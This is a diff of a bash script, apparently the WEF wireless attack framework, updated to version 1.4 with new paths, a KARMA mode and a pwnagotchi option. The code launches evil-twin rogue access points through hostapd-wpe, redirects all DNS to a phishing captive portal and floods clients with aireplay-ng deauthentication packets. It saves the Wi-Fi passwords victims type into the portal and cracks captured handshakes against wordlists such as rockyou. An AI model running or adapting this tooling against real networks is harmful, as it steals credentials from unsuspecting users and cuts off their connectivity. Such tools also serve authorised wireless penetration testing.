+            color_output "X" "Given path cannot be found"
           else
-            color_output "X" "El archivo no existe"
+            color_output "X" "No se encuentra la ruta especificada"
           fi
+        else
+          break
         fi
       done
     fi
 
     if [ "$lang" == "en" ]; then
-      color_output_no_line "*" "Do you want to spoof ${essid} BSSID? [${yC}y${blueC}/${yC}n${blueC}]: " && read mac_spoof
+      color_output_no_line "*" "Do you want to spoof ${essid} BSSID? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): " && read mac_spoof
     else
-      color_output_no_line "*" "¿Quieres suplantar la BSSID de ${essid}? [${yC}s${blueC}/${yC}n${blueC}]: " && read mac_spoof
+      color_output_no_line "*" "¿Quieres suplantar la BSSID de ${essid}? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): " && read mac_spoof
+    fi
+
+    if [ ! "$mac_spoof" ]; then
+      mac_spoof="no"
+    fi
+
+    if [ "$(command -v hostapd-wpe)" ]; then
+      if [ "$lang" == "en" ]; then
+        color_output_no_line "*" "Do you want to enable KARMA mode? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): " && read karma
+      else
+        color_output_no_line "*" "¿Quieres activar el modo KARMA? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): " && read karma
+      fi
+
+      if [ ! "$karma" ]; then
+        karma="no"
+      fi
     fi
   fi
 
@@ -3627,14 +4223,14 @@ function evil_twin(){
       else
         color_output "*" "Your network adapter does not seem to support VIF"
       fi
-      color_output_no_line "*" "To perform the DoS attack while the AP is running, physical card must be split into 2 cards (Virtual Interface). Do you want to continue? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read vif_check
+      color_output_no_line "*" "To perform the DoS attack while the AP is running, physical card must be split into 2 cards (Virtual Interface). Do you want to continue? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read vif_check
     else
       if [ "$(check_vif)" ]; then
         good_output "+" "Tu adaptador de red parece soportar VIF"
       else
         color_output "*" "Tu adaptador de red parece no soportar VIF"
       fi
-      color_output_no_line "*" "Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). ¿Quieres continuar? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read vif_check
+      color_output_no_line "*" "Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). ¿Quieres continuar? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read vif_check
     fi
 
     if [ "$vif_check" == "n" ] || [ "$vif_check" == "no" ] || [ "$vif_check" == "back" ]; then
@@ -3667,42 +4263,52 @@ function evil_twin(){
   systemctl stop systemd-resolved &>/dev/null
   fuser -k 80/tcp &>/dev/null; sleep 0.1
 
-  if [ "${kill_network_services}" == "true" ]; then
+  if [ "${airmon_check_kill}" == "true" ]; then
     airmon-ng check kill &>/dev/null
   fi
 
   killall hostapd hostapd-wpe dnsmasq lighttpd xterm dhcpd 2>/dev/null # Kill processes
-  rm /opt/wef/cache/*.conf 2>/dev/null
+  rm /usr/share/wef/cache/*.conf 2>/dev/null
 
   if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
-    while true; do
-      languages=$(ls /opt/wef/main/captive-portals | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)
-      if [ "$lang" == "en" ]; then
-        color_output_ln "*" "${blueC}Available languages:${grayC} ${languages}${endC}"
-        color_output_no_line "*" "Select captive portal language you want to use, enter country code (i.e. pt): " && read country_code
-      else
-        color_output_ln "*" "${blueC}Idiomas disponibles:${grayC} ${languages}${endC}"
-        color_output_no_line "*" "Selecciona el idioma del portal cautivo a usar, introduce el codigo del país (e.g. pt): " && read country_code
-      fi
-
-      if [ "$country_code" == "back" ]; then
-        return
-      fi
-
-      if [ "$(echo "${languages}" | grep "${country_code}")" ]; then
-        break
-      else
+    if [ "$template_type" == "built-in" ] || [ "$template_type" == "builtin" ] || [ "$template_type" == "predefinidas" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
+      while true; do
+        languages=$(ls /usr/share/wef/main/captive-portals | grep "-" | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)
         if [ "$lang" == "en" ]; then
-          color_output_ln "X" "Invalid option"; sleep 0.1
+          color_output_ln "*" "${blueC}Available languages:${grayC} ${languages}${endC}"
+          color_output_no_line "*" "Select captive portal language you want to use, enter country code (i.e. en) (default=en): " && read country_code
         else
-          color_output_ln "X" "Opción inválida"; sleep 0.1
+          color_output_ln "*" "${blueC}Idiomas disponibles:${grayC} ${languages}${endC}"
+          color_output_no_line "*" "Selecciona el idioma del portal cautivo a usar, introduce el código del país (e.g. es) (por defecto=en): " && read country_code
         fi
-      fi
-    done
 
-    portal_path="/opt/wef/main/captive-portals/${country_code}-portal"
+        if [ ! "$country_code" ]; then
+          country_code="en"
+        elif [ "$country_code" == "back" ]; then
+          return
+          evil_twin_c
+          killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null
+        fi
+
+        if [ "$(echo "${languages}" | grep "${country_code}")" ]; then
+          break
+        else
+          if [ "$lang" == "en" ]; then
+            color_output_ln "X" "Invalid option"; sleep 0.1
+          else
+            color_output_ln "X" "Opción inválida"; sleep 0.1
+          fi
+        fi
+      done
+    fi
+
+    # Set root of the web if a custom template was not provided
+    if [ ! "${portal_path}" ]; then
+      portal_path="/usr/share/wef/main/captive-portals/${country_code}-portal"
+      create_template
+    fi
+
     create_lighttpd_conf
-    create_template
   fi
 
   if [ "$lang" == "en" ]; then
@@ -3726,7 +4332,8 @@ auth_algs=1
 ignore_broadcast_ssid=0
 ieee80211n=1
 wme_enabled=1
-driver=nl80211" >> /opt/wef/cache/hostapd.conf
+driver=nl80211" >> /usr/share/wef/cache/hostapd.conf
+
   elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
     echo "interface=${evilCard}
 ssid=${essid}
@@ -3760,25 +4367,41 @@ logger_stdout_level=2
 hw_mode=${hw_mode}
 macaddr_acl=0
 auth_algs=3
-ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
+ignore_broadcast_ssid=0" >> /usr/share/wef/cache/hostapd.conf
   fi
 
   # Launch hostapd
   if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
-    if [ "${kill_network_services}" == "true" ]; then
+    if [ "${airmon_check_kill}" == "true" ]; then
       # No headless
-      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd /opt/wef/cache/hostapd.conf" 2>/dev/null &
+      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
+        xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /usr/share/wef/cache/hostapd.conf -k" 2>/dev/null &
+      else
+        xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd /usr/share/wef/cache/hostapd.conf" 2>/dev/null &
+      fi
     else
       # Headless
-      hostapd /opt/wef/cache/hostapd.conf &>/dev/null &
+      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
+        hostapd-wpe /usr/share/wef/cache/hostapd.conf -k &>/dev/null &
+      else
+        hostapd /usr/share/wef/cache/hostapd.conf &>/dev/null &
+      fi
     fi
   elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
-    if [ "${kill_network_services}" == "true" ]; then
+    if [ "${airmon_check_kill}" == "true" ]; then
       # No headless
-      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /opt/wef/cache/hostapd-wpe.conf" 2>/dev/null &
+      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
+        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /usr/share/wef/cache/hostapd.conf -s -k" 2>/dev/null &
+      else
+        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /usr/share/wef/cache/hostapd.conf -s" 2>/dev/null &
+      fi
     else
       # Headless
-      hostapd-wpe /opt/wef/cache/hostapd-wpe.conf &>/dev/null &
+      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
+        hostapd-wpe /usr/share/wef/cache/hostapd.conf -s -k &>/dev/null &
+      else
+        hostapd-wpe /usr/share/wef/cache/hostapd.conf -s &>/dev/null &
+      fi
     fi
   fi
   hostapd_PID=$!
@@ -3796,17 +4419,17 @@ ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
   log-queries
   log-dhcp
   listen-address=10.0.221.1
-  address=/#/10.0.221.1" >> /opt/wef/cache/dnsmasq.conf
+  address=/#/10.0.221.1" >> /usr/share/wef/cache/dnsmasq.conf
 
     ip address add 10.0.221.1/24 dev ${evilCard}
     #ifconfig ${evilCard} 10.0.221.1 netmask 255.255.255.0
     route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1
 
     # Dnsmasq
-    if [ "${kill_network_services}" == "true" ]; then
-      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Dnsmasq" -xrm 'XTerm*selectToClipboard: true' -e "dnsmasq -C /opt/wef/cache/dnsmasq.conf -d" 2>/dev/null &
+    if [ "${airmon_check_kill}" == "true" ]; then
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Dnsmasq" -xrm 'XTerm*selectToClipboard: true' -e "dnsmasq -C /usr/share/wef/cache/dnsmasq.conf -d" 2>/dev/null &
     else
-      dnsmasq -C /opt/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
+      dnsmasq -C /usr/share/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
     fi
     dnsmasq_PID=$!
 
@@ -3818,7 +4441,7 @@ ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
     iw dev mon${netCard} set channel ${channel} 2>/dev/null
     sleep 0.1
 
-    if [ "${kill_network_services}" == "true" ]; then
+    if [ "${airmon_check_kill}" == "true" ]; then
       xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Deauth" -xrm 'XTerm*selectToClipboard: true' -e "aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} mon${evilCard}" 2>/dev/null &
     else
       aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} "mon${evilCard}" > /dev/null 2>&1 &
@@ -3830,20 +4453,28 @@ ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
 
   if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
     # Start web server (Lighttpd)
-    if [ "${kill_network_services}" == "true" ]; then
-      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Lighttpd" -xrm 'XTerm*selectToClipboard: true' -e "lighttpd -D -f /opt/wef/cache/lighttpd.conf" 2>/dev/null &
+    if [ "${airmon_check_kill}" == "true" ]; then
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Lighttpd" -xrm 'XTerm*selectToClipboard: true' -e "lighttpd -D -f /usr/share/wef/cache/lighttpd.conf" 2>/dev/null &
     else
-      lighttpd -f /opt/wef/cache/lighttpd.conf > /dev/null 2>&1 &
+      lighttpd -f /usr/share/wef/cache/lighttpd.conf > /dev/null 2>&1 &
     fi
     lighttpd_PID=$!
 
     sleep 4
 
     export -f check_eviltwin_success # Export function
-    if [ "${kill_network_services}" == "true" ]; then
+    if [ "${airmon_check_kill}" == "true" ]; then
       xterm -hold -bg "#000000" -fg "#FFFFFF" -T "EvilTwin" -xrm 'XTerm*selectToClipboard: true' -e "check_eviltwin_success" 2>/dev/null &
       eviltwin_PID=$!
     fi
+
+    if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+      ap_dir="${essid}-${ap_bssid}"
+    elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+      ap_dir="${ap_bssid}"
+    fi
+
+    mkdir "/usr/share/wef/main/captures/${ap_dir}/"
 
     if [ "$lang" == "en" ]; then
       if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ]; then
@@ -3851,24 +4482,34 @@ ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
       else
         good_output_ln "+" "Evil Twin attack deployed successfully"
       fi
-      check_eviltwin_password & # This will notify the user is the correct password is provided
+
+      if [ "$template_type" == "built-in" ] || [ "$template_type" == "builtin" ] || [ "$template_type" == "predefinidas" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
+        check_eviltwin_password & # This will notify the user is the correct password is provided
+        color_output "*" "Gathered passwords attempts will be stored in /usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt"
+      else
+        color_output "*" "As you are using a custom template, make sure to check the obtained data by your own"
+      fi
+      
       press_enter "Press [Enter] to continue and finish the attack "
-      echo
-      color_output "*" "Gathered passwords have been stored in /opt/wef/cache/eviltwin_attempts.txt"
     else
       if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ]; then
         good_output_ln "+" "Ataque Evil Twin desplegado correctamente, cuando se introduzca la contraseña correcta se detendrá el ataque automaticamente"
       else
         good_output_ln "+" "Ataque Evil Twin desplegado correctamente"
       fi
-      check_eviltwin_password & # This will notify the user is the correct password is provided
+
+      if [ "$template_type" == "built-in" ] || [ "$template_type" == "builtin" ] || [ "$template_type" == "predefinidas" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
+        check_eviltwin_password & # This will notify the user is the correct password is provided
+        color_output "*" "Las contraseñas recolectadas serán almacenadas en /usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt"
+      else
+        color_output "*" "Al estar usando una plantilla personalizada, asegurate de comprobar la información obtenida por ti mismo"
+      fi
+
       press_enter "Presiona [Enter] para continuar y terminar el ataque "
-      echo
-      color_output "*" "Las contraseñas recolectadas se han almacenado en el archivo /opt/wef/cache/eviltwin_attempts.txt"
     fi
 
     sleep 0.5
-    cp "/tmp/www/attempts.txt" "/opt/wef/cache/eviltwin_attempts.txt" 2>/dev/null
+    cp "/tmp/www/attempts.txt" "/usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt" 2>/dev/null
 
   elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
 
@@ -3882,12 +4523,14 @@ ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
       press_enter "Presiona [Enter] para continuar y terminar el ataque "
     fi
 
-    mv hostapd-wpe.log /opt/wef/cache/hostapd-wpe.log 2>/dev/null
+    mv hostapd-wpe.log /usr/share/wef/cache/hostapd-wpe.log 2>/dev/null
   fi
+  
 
   # Attack finish here, restore interface and return to main menu
   rm -rf "/tmp/www" 2>/dev/null
   evil_twin_c
+  killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null
   airmon-ng start "${oldCard}" &>/dev/null
 }
 
@@ -3903,15 +4546,15 @@ export lang="en" # Default language
 
 SHELL="/bin/bash"
 
-config_lang=$(awk -F '=' '/lang/ {print $2}' /opt/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d " ")
+config_lang=$(awk -F '=' '/lang/ {print $2}' /usr/share/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d " ")
 if [ "$config_lang" == "en" ]; then
   lang="en"
 elif [ "$config_lang" == "es" ]; then
   lang="es"
 fi
 
-use_colors=$(awk -F '=' '/use_colors/ {print $2}' /opt/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d " ")
-if [ "$use_colors" == "true" ] || [ ! -d "/opt/wef" ]; then
+use_colors=$(awk -F '=' '/use_colors/ {print $2}' /usr/share/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d " ")
+if [ "$use_colors" == "true" ] || [ ! -d "/usr/share/wef" ]; then
   # Define colors and formats
   export greenC="\e[0;32m\033[1m"
   export endC="\033[0m\e[0m"
@@ -3929,7 +4572,7 @@ done
 # Main program function
 if [ "$(id -u)" == "0" ]; then
 
-  program_version="1.3"
+  program_version="1.4"
 
   while getopts ":i:" arg; do
     case ${arg} in
@@ -3956,10 +4599,24 @@ if [ "$(id -u)" == "0" ]; then
     fi
   done
 
-  if [ ! -d "/opt/wef/main/" ]; then
-    color_output "*" "This is the first time you execute WEF"
+  if [ ! -d "/usr/share/wef/main/" ]; then
     run_setup
     exit 0
+  fi
+
+  if [ ! -f "/usr/share/wef/wef.cnf" ]; then
+    echo "# This is default config file
+# This file must be saved as /usr/share/wef/wef.cnf
+# Then you can edit it to make it much more flexible and to adapt to your requirements
+
+# Default lenguage to use. Values: en, es
+lang=en
+
+# Colorize output (recommended to be enabled)
+use_colors=true
+
+# Enable/disable verbose by default (recommended to be enabled)
+verbose=true" > /usr/share/wef/wef.cnf
   fi
 
   if [ "$1" == "--interface" ]; then
@@ -4022,9 +4679,9 @@ if [ "$(id -u)" == "0" ]; then
     if [ "$(command -v iw)" ] && [ ! "$(iw list | grep "Supported interface modes" -A 8 | grep -i "monitor")" ]; then
       echo
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "Provided interface does not seem to support monitor mode. Do you want to continue? [${yC}y${blueC}/${yC}n${blueC}]: " && read check_mon
+        color_output_no_line "*" "Provided interface does not seem to support monitor mode. Do you want to continue? (${yC}yes${blueC}/${yC}no${blueC}): " && read check_mon
       else
-        color_output_no_line "*" "La interfaz proporcionada no parece soportar modo monitor. ¿Quieres continuar? [${yC}s${blueC}/${yC}n${blueC}]: " && read check_mon
+        color_output_no_line "*" "La interfaz proporcionada no parece soportar modo monitor. ¿Quieres continuar? (${yC}si${blueC}/${yC}no${blueC}): " && read check_mon
       fi
 
       if [ "$check_mon" != "y" ] && [ "$check_mon" != "yes" ] && [ "$check_mon" != "s" ] && [ "$check_mon" != "si" ]; then
@@ -4045,7 +4702,7 @@ if [ "$(id -u)" == "0" ]; then
     ip link set ${netCard} up 2>/dev/null
 
     # Define band based on config file
-    if [ "${frecuency_band}" == "auto" ]; then
+    if [ "${frequency_band}" == "auto" ]; then
       out="$(iw list | grep -A 10 'Frequencies:')"
       if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
         band="g"
@@ -4053,9 +4710,9 @@ if [ "$(id -u)" == "0" ]; then
         band="ag"
       fi
 
-    elif [ "${frecuency_band}" == "2.4" ] || [ "${frecuency_band}" == "2" ]; then
+    elif [ "${frequency_band}" == "2.4" ] || [ "${frequency_band}" == "2" ]; then
       band="g"
-    elif [ "${frecuency_band}" == "5" ]; then
+    elif [ "${frequency_band}" == "5" ]; then
       band="a"
     fi
 
@@ -4071,7 +4728,7 @@ if [ "$(id -u)" == "0" ]; then
 
         banner
         dir=$(pwd)
-        print_interface_mode; print_interface_name; print_mac_address
+        print_interface_name; print_interface_mode; print_mac_address
 
         attacks_panel
         if [ "$lang" == "en" ]; then
@@ -4335,7 +4992,32 @@ if [ "$(id -u)" == "0" ]; then
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "15" ] || [ "$option" == "evil" ] || [ "$option" == "eviltwin" ] || [ "$option" == "e" ]; then
+      elif [ "$option" == "15" ] || [ "$option" == "pwnagotchi" ]; then
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          echo
+          pwnagotchi_tools_missing="false"
+
+          if [ ! "$(command -v hcxpcapngtool)" ]; then
+            log_command_not_found "hcxpcapngtool"
+            pwnagotchi_tools_missing="true"
+          fi
+
+          if [ ! "$(command -v bettercap)" ]; then
+            log_command_not_found "bettercap"
+            pwnagotchi_tools_missing="true"
+          fi
+
+          if [ "$pwnagotchi_tools_missing" == "true" ]; then
+            continue
+          fi
+
+          pwnagotchi; clear_p=1
+        else
+          log_monitor_is_disabled
+        fi
+
+
+      elif [ "$option" == "16" ] || [ "$option" == "evil" ] || [ "$option" == "eviltwin" ] || [ "$option" == "e" ]; then
         if [ "$(check_interface_mode)" == "monitor" ]; then
           echo
           et_tools_missing="false"
@@ -4436,7 +5118,7 @@ if [ "$(id -u)" == "0" ]; then
         fi
 
       elif [ "$option" == "list" ] || [ "$option" == "list_aps" ]; then
-        if [ -f "/opt/wef/cache/airodump-01.csv" ]; then
+        if [ -f "/usr/share/wef/cache/airodump-01.csv" ]; then
           echo
           format_csv_info
         else
@@ -4510,11 +5192,11 @@ if [ "$(id -u)" == "0" ]; then
 
         if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
           if [ "$wordlist_to_use" == "rockyou" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
           elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/darkweb2017-top10000.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
           elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
           fi
 
           crack_handshake_aircrack "${capture_file}"
@@ -4554,11 +5236,11 @@ if [ "$(id -u)" == "0" ]; then
 
         if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
           if [ "$wordlist_to_use" == "rockyou" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
           elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/darkweb2017-top10000.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
           elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
           fi
 
           crack_handshake_john "${capture_file}"
@@ -4598,11 +5280,11 @@ if [ "$(id -u)" == "0" ]; then
 
         if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
           if [ "$wordlist_to_use" == "rockyou" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
           elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/darkweb2017-top10000.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
           elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
-            wordlist_to_use="/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt"
+            wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
           fi
 
           crack_handshake_hashcat "${capture_file}"
@@ -4660,8 +5342,8 @@ if [ "$(id -u)" == "0" ]; then
         fi
 
       elif [ "$option" == "info" ] || [ "$option" == "status" ]; then
-        print_interface_mode
         print_interface_name
+        print_interface_mode
         print_mac_address
         print_chipset
         print_freq_band
@@ -4675,35 +5357,19 @@ if [ "$(id -u)" == "0" ]; then
       elif [ "$option" == "chipsets" ] || [ "$option" == "chipset" ]; then
         chipsets_panel
 
-      elif [ "$option" == "verbose" ] || [ "$option" == "v" ]; then
-        verbose="true"
-        if [ "$lang" == "en" ]; then
-          echo -e "\n${blueC}Output verbose ON${endC}"
-        else
-          echo -e "\n${blueC}Verbose activado${endC}"
-        fi
-
-      elif [ "$option" == "noverbose" ] || [ "$option" == "no-verbose" ] || [ "$option" == "no verbose" ]; then
-        verbose="false"
-        if [ "$lang" == "en" ]; then
-          echo -e "\n${blueC}Output verbose OFF${endC}"
-        else
-          echo -e "\n${blueC}Verbose desactivado${endC}"
-        fi
-
       elif [ "$option" == "update" ]; then
         echo
         if [ "$lang" == "en" ]; then
           progress_bar 2 0.3 "*" "Checking the latest version"
         else
-          progress_bar 2 0.3 "*" "Comprobando la última version"
+          progress_bar 2 0.3 "*" "Comprobando la última versión"
         fi
         sleep 0.2
         if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/src/version.txt')" != "${program_version}" ]; then
           if [ "$lang" == "en" ]; then
-            echo -ne "\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read update_option
+            echo -ne "\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read update_option
           else
-            echo -ne "\n${blueC}[${greenC}+${blueC}] Nueva versión encontrada. ¿Quieres actualizar WEF? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read update_option
+            echo -ne "\n${blueC}[${greenC}+${blueC}] Nueva versión encontrada. ¿Quieres actualizar WEF? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read update_option
           fi
 
           if [ "$update_option" == "y" ] || [ "$update_option" == "yes" ] || [ "$update_option" == "s" ] || [ "$update_option" == "si" ]; then
@@ -4729,7 +5395,12 @@ if [ "$(id -u)" == "0" ]; then
 
       elif [ "$option" == "edit" ]; then
         editor=$(echo $EDITOR)
-        ${editor} /opt/wef/wef.cnf
+
+        if [ "${editor}" ]; then
+          ${editor} /usr/share/wef/wef.cnf
+        else
+          nano /usr/share/wef/wef.cnf
+        fi
 
       elif [ "$option" == "clear" ] || [ "$option" == "cls" ]; then
         clear
